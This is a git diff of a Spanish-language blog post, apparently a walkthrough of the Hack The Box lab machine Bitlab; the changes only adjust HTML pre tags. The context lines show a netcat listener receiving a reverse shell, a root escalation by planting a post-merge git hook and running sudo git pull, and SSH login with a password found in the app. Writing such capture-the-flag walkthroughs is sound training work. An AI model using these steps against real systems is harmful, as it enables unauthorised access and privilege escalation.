@@ -107,7 +107,7 @@ A pesar de todo, en el futuro actualizaré este post para reflejar el camino ví
 <p>Dicho eso, hora de ensuciarse las manos :D</p>
 <h2 id=nmap>Nmap</h2>
 <p>Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
 Nmap scan report for bitlab.htb (10.10.10.114)
 Host is up (0.019s latency).
@@ -178,7 +178,7 @@ $branch <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&g
 <img src=https://ceso.github.io/images/htb/bitlab/1.rce.png class=center style=border-radius:8px>
 <p>Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar.
 Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
@@ -191,7 +191,7 @@ www-data@bitlab:/var/www$ pwd
 pwd
 /var/www
 </code></pre><p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p>
-<pre><code class=language-console data-lang=console>www-data@bitlab:/var/www$ sudo -l
+<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/var/www$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
     env_reset, exempt_group=sudo, mail_badpass,
@@ -217,7 +217,7 @@ drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
 -rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
 </code></pre><p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para <a href=https://git-scm.com/docs/githooks#_post_merge>hooks: post merge</a> y la de <a href=https://git-scm.com/docs/git-pull>git pull</a>.</p>
 <p>Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:</p>
-<pre><code class=language-console data-lang=console>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
 cp -r profile /tmp/profile
 www-data@bitlab:/tmp/profile$ ls -la
 ls -la
@@ -233,14 +233,14 @@ drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
 drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
 -rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
 </code></pre><p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p>
-<pre><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ cd .git/hooks
+<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ cd .git/hooks
 cd .git/hooks
 www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 &lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
 chmod u+x post-merge
 </code></pre><p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p>
-<pre><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ sudo git pull
+<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ sudo git pull
 sudo git pull
 remote: Enumerating objects: 4, done.
 remote: Counting objects: 100% (4/4), done.
@@ -289,7 +289,7 @@ Ok, as I said at the begining of the post, there are 2 paths to get this box:</p
 </code></pre></div><p>Y despué de guardarlos y hacerle merge, nos vamos a <code>http://10.10.10.114/profile/&lt;el nombre que le diste al script></code>, y deberíamos tener como resultado el array en pantalla con el usuario <code>clave</code> y una contraseñá:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>Array ( [<span style=color:#ae81ff>0</span>] =&gt; Array ( [<span style=color:#a6e22e>id</span>] =&gt; <span style=color:#ae81ff>1</span> [<span style=color:#a6e22e>username</span>] =&gt; <span style=color:#a6e22e>clave</span> [<span style=color:#a6e22e>password</span>] =&gt; <span style=color:#a6e22e>c3NoLXN0cjBuZy1wQHNz</span><span style=color:#f92672>==</span> ) )
 </code></pre></div><p>Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!</p>
-<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
 clave@10.10.10.114's password: 
 Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
 clave@bitlab:~$ id
